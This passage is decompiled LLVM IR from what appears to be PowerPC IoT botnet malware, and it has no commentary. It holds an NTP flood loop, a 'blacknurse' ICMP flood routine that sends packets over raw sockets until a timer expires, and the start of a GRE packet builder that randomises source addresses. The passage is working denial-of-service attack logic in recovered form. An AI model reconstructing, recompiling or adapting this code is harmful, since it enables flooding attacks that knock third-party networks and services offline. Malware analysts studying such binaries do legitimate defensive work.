  %v1_10004cbc = add i32 %v0_10004ca8, %v2_10004cb8
  store i32 %v1_10004cbc, i32* %r9.global-to-local, align 4
  %v1_10004cc0 = inttoptr i32 %v1_10004cbc to i8*
  %v2_10004cc0 = load i8, i8* %v1_10004cc0, align 1
  %v3_10004cc8 = icmp eq i8 %v2_10004cc0, 10
  br i1 %v3_10004cc8, label %dec_label_pc_10004cfc, label %dec_label_pc_10004cd0

dec_label_pc_10004cd0:                            ; preds = %dec_label_pc_10004ca4
  store i32 %v0_10004c20, i32* @r3, align 4
  %v0_10004cd4 = call i32 @__GI_strlen()
  %v1_10004ce8 = add i32 %v0_10004cd4, %v2_10004cb8
  store i32 %v1_10004ce8, i32* %r9.global-to-local, align 4
  %v1_10004cec = inttoptr i32 %v1_10004ce8 to i8*
  %v2_10004cec = load i8, i8* %v1_10004cec, align 1
  %v3_10004cf4 = icmp eq i8 %v2_10004cec, 13
  br i1 %v3_10004cf4, label %dec_label_pc_10004cfc, label %dec_label_pc_10004e30

dec_label_pc_10004cfc:                            ; preds = %dec_label_pc_10004cd0, %dec_label_pc_10004ca4
  store i32 %v0_10004c20, i32* @r3, align 4
  %v0_10004d00 = call i32 @__GI_strlen()
  %v1_10004d14 = add i32 %v0_10004d00, %v2_10004cb8
  %v3_10004d1c = inttoptr i32 %v1_10004d14 to i8*
  store i8 0, i8* %v3_10004d1c, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10004d24 = load i32, i32* @global_var_100451b4.106, align 4
  %v3_10004d28 = icmp eq i32 %v3_10004d24, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10004d28, label %dec_label_pc_10004d30, label %dec_label_pc_10004db4

dec_label_pc_10004d30:                            ; preds = %dec_label_pc_10004cfc
  store i32 268455224, i32* @lr, align 4
  %v0_10004d34 = call i32 @malloc()
  store i32 %v0_10004d34, i32* @global_var_100451b4.106, align 4
  store i32 %v0_10004d34, i32* %r9.global-to-local, align 4
  %v2_10004d54 = inttoptr i32 %v0_10004d34 to i32*
  store i32 0, i32* %v2_10004d54, align 4
  %v1_10004d5c = load i32, i32* %r9.global-to-local, align 4
  %v2_10004d5c = add i32 %v1_10004d5c, 4
  %v3_10004d5c = inttoptr i32 %v2_10004d5c to i32*
  store i32 0, i32* %v3_10004d5c, align 4
  %v1_10004d64 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004d64 = add i32 %v1_10004d64, 8
  %v3_10004d64 = inttoptr i32 %v2_10004d64 to i32*
  store i32 0, i32* %v3_10004d64, align 4
  %v1_10004d6c = load i32, i32* %r9.global-to-local, align 4
  %v2_10004d6c = add i32 %v1_10004d6c, 12
  %v3_10004d6c = inttoptr i32 %v2_10004d6c to i32*
  store i32 0, i32* %v3_10004d6c, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10004d74 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 268455296, i32* @lr, align 4
  %v1_10004d7c = call i32 @inet_addr(i32 %v0_10004c20)
  %v2_10004d84 = add i32 %v3_10004d74, 4
  %v3_10004d84 = inttoptr i32 %v2_10004d84 to i32*
  store i32 %v1_10004d7c, i32* %v3_10004d84, align 4
  %v3_10004d8c = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10004d98 = add i32 %v3_10004d8c, 532
  %v3_10004d98 = inttoptr i32 %v2_10004d98 to i32*
  store i32 %v3_10004d8c, i32* %v3_10004d98, align 4
  %v3_10004da0 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10004da0, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10004dac = add i32 %v3_10004da0, 536
  %v3_10004dac = inttoptr i32 %v2_10004dac to i32*
  store i32 %v3_10004da0, i32* %v3_10004dac, align 4
  br label %dec_label_pc_10004e24

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004cfc
  store i32 268455356, i32* @lr, align 4
  %v0_10004db8 = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10004db8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268455388, i32* @lr, align 4
  %v0_10004dd8 = call i32 @__GI_memset()
  store i32 268455396, i32* @lr, align 4
  %v1_10004de0 = call i32 @inet_addr(i32 %v0_10004c20)
  %v2_10004dec = add i32 %v0_10004db8, 4
  %v3_10004dec = inttoptr i32 %v2_10004dec to i32*
  store i32 %v1_10004de0, i32* %v3_10004dec, align 4
  %v3_10004df4 = load i32, i32* @global_var_100451b4.106, align 4
  %v2_10004dfc = add i32 %v0_10004db8, 536
  %v3_10004dfc = inttoptr i32 %v2_10004dfc to i32*
  store i32 %v3_10004df4, i32* %v3_10004dfc, align 4
  %v3_10004e04 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10004e04, i32* %r9.global-to-local, align 4
  %v1_10004e08 = add i32 %v3_10004e04, 532
  %v2_10004e08 = inttoptr i32 %v1_10004e08 to i32*
  %v3_10004e08 = load i32, i32* %v2_10004e08, align 4
  %v2_10004e10 = add i32 %v0_10004db8, 532
  %v3_10004e10 = inttoptr i32 %v2_10004e10 to i32*
  store i32 %v3_10004e08, i32* %v3_10004e10, align 4
  %v3_10004e18 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10004e18, i32* %r9.global-to-local, align 4
  %v2_10004e20 = add i32 %v3_10004e18, 532
  %v3_10004e20 = inttoptr i32 %v2_10004e20 to i32*
  store i32 %v0_10004db8, i32* %v3_10004e20, align 4
  br label %dec_label_pc_10004e24

dec_label_pc_10004e24:                            ; preds = %dec_label_pc_10004d30, %dec_label_pc_10004db4
  store i32 %stack_var_-1096.0.ph, i32* %r9.global-to-local, align 4
  %v1_10004e28 = add i32 %stack_var_-1096.0.ph, 1
  br label %dec_label_pc_10004e30.outer

dec_label_pc_10004e30.outer:                      ; preds = %dec_label_pc_10004e24, %dec_label_pc_10004b50
  %stack_var_-1096.0.ph = phi i32 [ %v1_10004e28, %dec_label_pc_10004e24 ], [ 0, %dec_label_pc_10004b50 ]
  br label %dec_label_pc_10004e30

dec_label_pc_10004e30:                            ; preds = %dec_label_pc_10004e30.outer, %dec_label_pc_10004cd0
  store i32 268455488, i32* @lr, align 4
  %v3_10004e3c = call i32 @fgets(i32 %v0_10004c20, i32 128, i32 %v3_10004c94)
  %v3_10004e44 = icmp eq i32 %v3_10004e3c, 0
  br i1 %v3_10004e44, label %dec_label_pc_10004e4c, label %dec_label_pc_10004ca4

dec_label_pc_10004e4c:                            ; preds = %dec_label_pc_10004e30
  %v3_10004e50 = load i32, i32* @global_var_100451b4.106, align 4
  store i32 %v3_10004e50, i32* %r9.global-to-local, align 4
  %v1_10004e54 = add i32 %v3_10004e50, 532
  %v2_10004e54 = inttoptr i32 %v1_10004e54 to i32*
  %v3_10004e54 = load i32, i32* %v2_10004e54, align 4
  %v1_10004e68 = add i32 %arg4, 4
  store i32 %v1_10004e68, i32* %r9.global-to-local, align 4
  %v1_10004e6c = inttoptr i32 %v1_10004e68 to i32*
  %v2_10004e6c = load i32, i32* %v1_10004e6c, align 4
  store i32 268455544, i32* @lr, align 4
  %v1_10004e74 = call i32 @inet_addr(i32 %v2_10004e6c)
  %v1_10004e84 = mul i32 %v1_10004c3c, 28
  %v1_10004e8c = add i32 %v1_10004e84, 30
  %v1_10004e90 = and i32 %v1_10004e8c, -16
  %v2_10004e98 = load i32, i32* %stack_var_-1136, align 4
  %v1_10004ea0 = load i32, i32* @r1, align 4
  %v3_10004ea0 = sub i32 %v1_10004ea0, %v1_10004e90
  %v4_10004ea0 = inttoptr i32 %v3_10004ea0 to i32*
  store i32 %v2_10004e98, i32* %v4_10004ea0, align 4
  %v1_10004eb0 = add i32 %v3_10004ea0, 23
  %v1_10004eb4 = and i32 %v1_10004eb0, -16
  store i32 %v1_10004c3c, i32* %r9.global-to-local, align 4
  %v2_10004f644 = icmp sgt i32 %v1_10004c3c, 0
  br i1 %v2_10004f644, label %dec_label_pc_10004ed4, label %dec_label_pc_10004f6c

dec_label_pc_10004ed4:                            ; preds = %dec_label_pc_10004e4c, %dec_label_pc_10004ed4
  %storemerge27 = phi i32 [ %v1_10004f54, %dec_label_pc_10004ed4 ], [ 0, %dec_label_pc_10004e4c ]
  %v1_10004edc = mul i32 %storemerge27, 28
  %v2_10004ee0 = add i32 %v1_10004edc, %v1_10004eb4
  %v2_10004ee8 = inttoptr i32 %v2_10004ee0 to i32*
  store i32 %storemerge27, i32* %v2_10004ee8, align 4
  store i32 %v2_10004ee0, i32* %r9.global-to-local, align 4
  store i32 %v1_10004e74, i32* %r11.global-to-local, align 4
  %v2_10004f0c = add i32 %v2_10004ee0, 8
  %v3_10004f0c = inttoptr i32 %v2_10004f0c to i32*
  store i32 2, i32* %v3_10004f0c, align 4
  %v0_10004f10 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004f10 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004f10 = add i32 %v1_10004f10, 12
  %v3_10004f10 = inttoptr i32 %v2_10004f10 to i32*
  store i32 %v0_10004f10, i32* %v3_10004f10, align 4
  %v0_10004f14 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004f14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004f14 = add i32 %v1_10004f14, 16
  %v3_10004f14 = inttoptr i32 %v2_10004f14 to i32*
  store i32 %v0_10004f14, i32* %v3_10004f14, align 4
  %v1_10004f18 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004f18 = add i32 %v1_10004f18, 20
  %v3_10004f18 = inttoptr i32 %v2_10004f18 to i32*
  store i32 %tmp, i32* %v3_10004f18, align 4
  %v1_10004f2c = add i32 %v2_10004ee0, 4
  %v2_10004f34 = inttoptr i32 %v1_10004f2c to i32*
  store i32 %v3_10004e54, i32* %v2_10004f34, align 4
  store i32 %v1_10004eb4, i32* %r9.global-to-local, align 4
  %v3_10004f4c = call i32 @ntpflood(i32 %v2_10004ee0, i32 %tmp, i32 %v1_10004eb4)
  %v1_10004f54 = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10004c3c, i32* %r9.global-to-local, align 4
  %v2_10004f64 = icmp slt i32 %v1_10004f54, %v1_10004c3c
  br i1 %v2_10004f64, label %dec_label_pc_10004ed4, label %dec_label_pc_10004f6c

dec_label_pc_10004f6c:                            ; preds = %dec_label_pc_10004ed4, %dec_label_pc_10004e4c
  store i32 %v1_10004e68, i32* %r9.global-to-local, align 4
  %v2_10004f74 = load i32, i32* %v1_10004e6c, align 4
  %v1_10004f7c = add i32 %arg4, 8
  store i32 %v1_10004f7c, i32* %r9.global-to-local, align 4
  %v1_10004f80 = inttoptr i32 %v1_10004f7c to i32*
  %v2_10004f80 = load i32, i32* %v1_10004f80, align 4
  store i32 %v2_10004f80, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_10004fa0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1002ab5c.261 to i32), i32 %arg2, i32 %v2_10004f74)
  %v1_10005088 = add i32 %arg4, 24
  %v1_1000508c = inttoptr i32 %v1_10005088 to i32*
  br label %dec_label_pc_10005084

dec_label_pc_10004fb0:                            ; preds = %dec_label_pc_10005084
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268455880, i32* @lr, align 4
  %v1_10004fc4 = call i32 @usleep(i32 50000)
  %v3_10004fcc = load i32, i32* @global_var_100451ac.120, align 4
  %v2_10004fd4 = mul i32 %v3_10004fcc, 20
  %v3_10004fdc = icmp ugt i32 %v2_10004fd4, %v1_10004c58
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10004fe8 = load i32, i32* @global_var_10045194.121, align 4
  br i1 %v3_10004fdc, label %dec_label_pc_10004fe4, label %dec_label_pc_10005024

dec_label_pc_10004fe4:                            ; preds = %dec_label_pc_10004fb0
  %v2_10004fec = icmp sgt i32 %v3_10004fe8, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10004fec, label %dec_label_pc_1000500c, label %dec_label_pc_10004ff4

dec_label_pc_10004ff4:                            ; preds = %dec_label_pc_10004fe4
  %v3_10004ff8 = load i32, i32* @global_var_100450d4.122, align 4
  %v1_10004ffc = add i32 %v3_10004ff8, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10004ffc, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_1000506c

dec_label_pc_1000500c:                            ; preds = %dec_label_pc_10004fe4
  %v1_10005014 = add i32 %v3_10004fe8, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005014, i32* @global_var_10045194.121, align 4
  br label %dec_label_pc_1000506c

dec_label_pc_10005024:                            ; preds = %dec_label_pc_10004fb0
  %v1_1000502c = add i32 %v3_10004fe8, 1
  store i32 %v1_1000502c, i32* @global_var_10045194.121, align 4
  %v3_1000503c = load i32, i32* @global_var_100450d4.122, align 4
  %tmp38 = icmp ult i32 %v3_1000503c, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp38, label %dec_label_pc_10005060, label %dec_label_pc_10005048

dec_label_pc_10005048:                            ; preds = %dec_label_pc_10005024
  %v1_10005050 = add i32 %v3_1000503c, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005050, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_1000506c

dec_label_pc_10005060:                            ; preds = %dec_label_pc_10005024
  store i32 0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_1000506c

dec_label_pc_1000506c:                            ; preds = %dec_label_pc_10005048, %dec_label_pc_1000500c, %dec_label_pc_10004ff4, %dec_label_pc_10005060
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 %storemerge3, i32* %r9.global-to-local, align 4
  %v1_1000507c = add i32 %storemerge3, 1
  br label %dec_label_pc_10005084

dec_label_pc_10005084:                            ; preds = %dec_label_pc_10004f6c, %dec_label_pc_1000506c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10004f6c ], [ %v1_1000507c, %dec_label_pc_1000506c ]
  store i32 %v1_10005088, i32* %r9.global-to-local, align 4
  %v2_1000508c = load i32, i32* %v1_1000508c, align 4
  store i32 268456088, i32* @lr, align 4
  %v1_10005094 = call i32 @atol(i32 %v2_1000508c)
  %v2_100050a0 = mul i32 %v1_10005094, 20
  store i32 %v2_100050a0, i32* %r9.global-to-local, align 4
  %v3_100050a8 = icmp sgt i32 %v2_100050a0, %storemerge3
  br i1 %v3_100050a8, label %dec_label_pc_10004fb0, label %dec_label_pc_100050b0

dec_label_pc_100050b0:                            ; preds = %dec_label_pc_10005084
  %v0_100050b4 = call i32 @__GI_exit()
  br label %dec_label_pc_100050b8

dec_label_pc_100050b8:                            ; preds = %entry, %dec_label_pc_10004b20, %dec_label_pc_100050b0
  %v0_100050e4 = phi i32 [ %v1_10004ab8, %entry ], [ %v0_10004b30, %dec_label_pc_10004b20 ], [ %v0_100050b4, %dec_label_pc_100050b0 ]
  %v2_100050b8 = load i32, i32* %stack_var_-1136, align 4
  store i32 %v5_10004a80, i32* %r9.global-to-local, align 4
  store i32 %v2_100050b8, i32* %r11.global-to-local, align 4
  ret i32 %v0_100050e4

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 0, 1 }
  uselistorder i32 %v3_10004fe8, { 1, 0, 2 }
  uselistorder i32 %v1_10005088, { 1, 0 }
  uselistorder i32 %v1_10004f54, { 1, 0 }
  uselistorder i32 %v2_10004ee0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge27, { 2, 1, 0 }
  uselistorder i32 %v1_10004eb4, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1096.0.ph, { 1, 0 }
  uselistorder i32 %v3_10004da0, { 1, 0, 2 }
  uselistorder i32 %v3_10004d8c, { 1, 0 }
  uselistorder i32 %v1_10004c3c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10004c20, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_10004b90, { 1, 0, 2 }
  uselistorder i32 %v2_10004b80, { 1, 0 }
  uselistorder i32 %v1_10004b3c, { 2, 1, 0, 3, 4 }
  uselistorder i32* %v1_10004b28, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_10004b24, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-1136, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 9, 11, 2, 4, 3, 5, 6, 7, 8, 10, 12, 13, 14, 20, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100050b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005084, { 1, 0 }
  uselistorder label %dec_label_pc_1000506c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10004e24, { 1, 0 }
  uselistorder label %dec_label_pc_10004b20, { 1, 0 }
  uselistorder label %dec_label_pc_10004af4, { 1, 0 }
}

define i32 @blacknurse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v2_10005118 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_10005118, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002ab80.263 to i32), i32* @r4, align 4
  store i32 36, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10005130.264 to i32), i32* @lr, align 4
  %v0_1000512c = call i32 @memcpy()
  store i32 268456256, i32* @lr, align 4
  %v1_1000513c = call i32 @__GI_time(i32 0)
  %v1_1000514c = call i32 @mfork(i32 %arg2)
  %v3_10005154 = icmp eq i32 %v1_1000514c, 0
  br i1 %v3_10005154, label %dec_label_pc_1000515c, label %dec_label_pc_100053f0

dec_label_pc_1000515c:                            ; preds = %entry
  store i32 268456300, i32* @lr, align 4
  %v3_10005168 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp34 = icmp sgt i32 %v3_10005168, -1
  br i1 %tmp34, label %dec_label_pc_10005188, label %dec_label_pc_10005180

dec_label_pc_10005180:                            ; preds = %dec_label_pc_1000515c
  %v0_10005184 = call i32 @__GI_exit()
  br label %dec_label_pc_10005188

dec_label_pc_10005188:                            ; preds = %dec_label_pc_1000515c, %dec_label_pc_10005180
  %v2_1000518c = icmp sgt i32 %arg3, 1
  br i1 %v2_1000518c, label %dec_label_pc_100051b4, label %dec_label_pc_10005194

dec_label_pc_10005194:                            ; preds = %dec_label_pc_10005188
  %v6_100051a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([41 x i8]* @global_var_1002aba4.265 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_100051b0 = call i32 @__GI_exit()
  br label %dec_label_pc_100051b4

dec_label_pc_100051b4:                            ; preds = %dec_label_pc_10005188, %dec_label_pc_10005194
  %v1_100051b8 = add i32 %arg4, 4
  %v1_100051bc = inttoptr i32 %v1_100051b8 to i32*
  %v2_100051bc = load i32, i32* %v1_100051bc, align 4
  %v1_100051c8 = add i32 %arg4, 8
  %v1_100051cc = inttoptr i32 %v1_100051c8 to i32*
  %v2_100051cc = load i32, i32* %v1_100051cc, align 4
  store i32 268456408, i32* @lr, align 4
  %v1_100051d4 = call i32 @atol(i32 %v2_100051cc)
  %v2_100051e0 = ptrtoint i32* %stack_var_-88 to i32
  store i32 0, i32* %stack_var_-88, align 4
  %v2_10005230 = ptrtoint i32* %stack_var_-92 to i32
  store i32 268456520, i32* @lr, align 4
  %v5_10005244 = inttoptr i32 %v2_100051bc to i8*
  %v6_10005244 = call i32 @getaddrinfo(i8* %v5_10005244, i32 0, i32 %v2_100051e0, i32 %v2_10005230, i32 %v2_10005230)
  %v3_10005254 = icmp eq i32 %v6_10005244, 0
  br i1 %v3_10005254, label %dec_label_pc_10005264, label %dec_label_pc_1000525c

dec_label_pc_1000525c:                            ; preds = %dec_label_pc_100051b4
  %v0_10005260 = call i32 @__GI_exit()
  br label %dec_label_pc_10005264

dec_label_pc_10005264:                            ; preds = %dec_label_pc_100051b4, %dec_label_pc_1000525c
  store i32 268456564, i32* @lr, align 4
  %v3_10005270 = call i32 @socket(i32 2, i32 3, i32 1)
  %v4_10005284 = icmp eq i32 %v3_10005270, -1
  br i1 %v4_10005284, label %dec_label_pc_1000528c, label %dec_label_pc_100052a0

dec_label_pc_1000528c:                            ; preds = %dec_label_pc_10005264
  store i32 ptrtoint ([7 x i8]* @global_var_1002abd0.268 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005298.269 to i32), i32* @lr, align 4
  %v0_10005294 = call i32 @perror()
  %v0_1000529c = call i32 @__GI_exit()
  br label %dec_label_pc_100052a0

dec_label_pc_100052a0:                            ; preds = %dec_label_pc_10005264, %dec_label_pc_1000528c
  %v6_100052b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002abd8.270 to i32), i32 %arg2, i32 %v2_100051bc)
  store i32 %v3_10005270, i32* %stack_var_-56, align 4
  %v2_10005368 = ptrtoint i32* %stack_var_-56 to i32
  %v2_100053c4 = add i32 %v1_100051d4, %v1_1000513c
  br label %dec_label_pc_100052d8.outer

dec_label_pc_100052d8.outer:                      ; preds = %dec_label_pc_100053e0, %dec_label_pc_100052a0
  %stack_var_-156.0.ph = phi i32 [ %v1_100053e4, %dec_label_pc_100053e0 ], [ %tmp, %dec_label_pc_100052a0 ]
  br label %dec_label_pc_100052d8

dec_label_pc_100052d8:                            ; preds = %dec_label_pc_100052d8.outer, %dec_label_pc_10005368
  br label %dec_label_pc_100052e4

dec_label_pc_100052e4:                            ; preds = %dec_label_pc_100052d8, %dec_label_pc_100052e4
  %storemerge12 = phi i32 [ 20, %dec_label_pc_100052d8 ], [ %v1_10005304, %dec_label_pc_100052e4 ]
  store i32 268456692, i32* @lr, align 4
  %v0_100052f0 = call i32 @random()
  %v1_100052fc = trunc i32 %v0_100052f0 to i8
  %v2_100052fc = load i32, i32* @r29, align 4
  %v3_100052fc = inttoptr i32 %v2_100052fc to i8*
  store i8 %v1_100052fc, i8* %v3_100052fc, align 1
  %v1_10005304 = add nuw nsw i32 %storemerge12, 1
  %tmp35 = icmp ult i32 %v1_10005304, 32
  br i1 %tmp35, label %dec_label_pc_100052e4, label %dec_label_pc_10005318

dec_label_pc_10005318:                            ; preds = %dec_label_pc_100052e4
  %v3_10005318 = load i32, i32* %stack_var_-92, align 4
  %v1_1000531c = add i32 %v3_10005318, 20
  %v2_1000531c = inttoptr i32 %v1_1000531c to i32*
  %v3_1000531c = load i32, i32* %v2_1000531c, align 4
  %v1_10005324 = add i32 %v3_10005318, 16
  %v2_10005324 = inttoptr i32 %v1_10005324 to i32*
  %v3_10005324 = load i32, i32* %v2_10005324, align 4
  store i32 268456772, i32* @lr, align 4
  %v6_10005340 = call i32 @sendto(i32 %v3_10005270, i32 %v2_10005118, i32 36, i32 0, i32 %v3_1000531c, i32 %v3_10005324)
  %v4_1000534c = icmp eq i32 %v6_10005340, 36
  br i1 %v4_1000534c, label %dec_label_pc_100053a4, label %dec_label_pc_10005354

dec_label_pc_10005354:                            ; preds = %dec_label_pc_10005318
  %v0_10005354 = call i32 @__errno_location()
  %v1_1000535c = inttoptr i32 %v0_10005354 to i32*
  %v2_1000535c = load i32, i32* %v1_1000535c, align 4
  %v3_10005360 = icmp eq i32 %v2_1000535c, 105
  br i1 %v3_10005360, label %dec_label_pc_10005368, label %dec_label_pc_10005380

dec_label_pc_10005368:                            ; preds = %dec_label_pc_10005354
  store i32 268456828, i32* @lr, align 4
  %v3_10005378 = call i32 @__libc_poll(i32 %v2_10005368, i32 1, i32 1000)
  br label %dec_label_pc_100052d8

dec_label_pc_10005380:                            ; preds = %dec_label_pc_10005354
  store i32 ptrtoint ([7 x i8]* @global_var_1002abf4.271 to i32), i32* @r3, align 4
  store i32 268456844, i32* @lr, align 4
  %v0_10005388 = call i32 @perror()
  store i32 268456852, i32* @lr, align 4
  %v1_10005390 = call i32 @close(i32 %v3_10005270)
  %v3_10005394 = load i32, i32* %stack_var_-92, align 4
  store i32 ptrtoint (i32* @global_var_100053a0.272 to i32), i32* @lr, align 4
  %v1_1000539c = call i32 @freeaddrinfo(i32 %v3_10005394)
  br label %dec_label_pc_100053f0

dec_label_pc_100053a4:                            ; preds = %dec_label_pc_10005318
  %tmp36 = icmp slt i32 %stack_var_-156.0.ph, 100
  br i1 %tmp36, label %dec_label_pc_100053e0, label %dec_label_pc_100053b0

dec_label_pc_100053b0:                            ; preds = %dec_label_pc_100053a4
  store i32 268456888, i32* @lr, align 4
  %v1_100053b4 = call i32 @__GI_time(i32 0)
  %v2_100053c8 = icmp slt i32 %v1_100053b4, %v2_100053c4
  br i1 %v2_100053c8, label %dec_label_pc_100053d8, label %dec_label_pc_100053d0

dec_label_pc_100053d0:                            ; preds = %dec_label_pc_100053b0
  %v0_100053d4 = call i32 @__GI_exit()
  br label %dec_label_pc_100053d8

dec_label_pc_100053d8:                            ; preds = %dec_label_pc_100053b0, %dec_label_pc_100053d0
  br label %dec_label_pc_100053e0

dec_label_pc_100053e0:                            ; preds = %dec_label_pc_100053a4, %dec_label_pc_100053d8
  %stack_var_-156.1 = phi i32 [ %stack_var_-156.0.ph, %dec_label_pc_100053a4 ], [ 0, %dec_label_pc_100053d8 ]
  %v1_100053e4 = add i32 %stack_var_-156.1, 1
  br label %dec_label_pc_100052d8.outer

dec_label_pc_100053f0:                            ; preds = %entry, %dec_label_pc_10005380
  %v0_10005408 = phi i32 [ %v1_1000514c, %entry ], [ %v1_1000539c, %dec_label_pc_10005380 ]
  ret i32 %v0_10005408

; uselistorder directives
  uselistorder i32 %stack_var_-156.0.ph, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100053f0, { 1, 0 }
  uselistorder label %dec_label_pc_100053e0, { 1, 0 }
  uselistorder label %dec_label_pc_100053d8, { 1, 0 }
  uselistorder label %dec_label_pc_100052e4, { 1, 0 }
  uselistorder label %dec_label_pc_100052d8, { 1, 0 }
  uselistorder label %dec_label_pc_100052a0, { 1, 0 }
  uselistorder label %dec_label_pc_10005264, { 1, 0 }
  uselistorder label %dec_label_pc_100051b4, { 1, 0 }
  uselistorder label %dec_label_pc_10005188, { 1, 0 }
}

define i32 @setup_gre_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  store i32 21, i32* @global_var_100451c8.274, align 4
  %v1_10005470 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10005470, i32* inttoptr (i32 1 to i32*), align 4
  %v1_10005484 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10005484, i32* inttoptr (i32 1 to i32*), align 4
  store i8 0, i8* inttoptr (i32 2 to i8*), align 2
  store i32 268457124, i32* @lr, align 4
  %v2_100054a0 = call i32 @realrand(i32 1, i32 255)
  store i32 268457140, i32* @lr, align 4
  %v2_100054b0 = call i32 @realrand(i32 1, i32 255)
  store i32 268457156, i32* @lr, align 4
  %v2_100054c0 = call i32 @realrand(i32 1, i32 255)
  store i32 268457172, i32* @lr, align 4
  %v2_100054d0 = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004ed98.275 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32* @r5, align 4
  %v0_100054ec = load i32, i32* @r29, align 4
  %v0_100054f0 = load i32, i32* @r28, align 4
  %v0_100054f4 = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005504.277 to i32), i32* @lr, align 4
  %v9_10005500 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004ed98.275 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32 %v0_100054ec, i32 %v0_100054f0, i32 %v0_100054f4, i32 %v2_100054d0, i32 ptrtoint (i32* @0 to i32))
  store i32 268457232, i32* @lr, align 4
  %v2_1000550c = call i32 @realrand(i32 1, i32 255)
  store i32 268457248, i32* @lr, align 4
  %v2_1000551c = call i32 @realrand(i32 1, i32 255)
  store i32 268457264, i32* @lr, align 4
  %v2_1000552c = call i32 @realrand(i32 1, i32 255)
  store i32 268457280, i32* @lr, align 4
  %v2_1000553c = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004dc70.278 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32* @r5, align 4
  %v0_10005558 = load i32, i32* @r29, align 4
  %v0_1000555c = load i32, i32* @r28, align 4
  %v0_10005560 = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005570.279 to i32), i32* @lr, align 4
